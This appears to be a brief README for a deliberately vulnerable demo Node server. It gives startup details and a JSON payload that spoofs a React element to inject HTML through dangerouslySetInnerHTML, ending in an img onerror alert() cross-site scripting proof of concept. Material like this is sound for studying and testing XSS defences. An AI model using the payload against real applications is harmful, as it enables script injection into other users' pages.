- start with `nodemon server.js`
- runs on localhost:8004

vulnerable to:
{
    _isReactElement: true,
    _store: {originalProps: {}},
    type: "body",
    props: {
        dangerouslySetInnerHTML: {
            __html:
                `<a href='http://danlec.com'>Arbitrary HTML</a>
                 <img src="" width="0" height="0" onerror="alert('Haxzored!')">`
        }
    }
}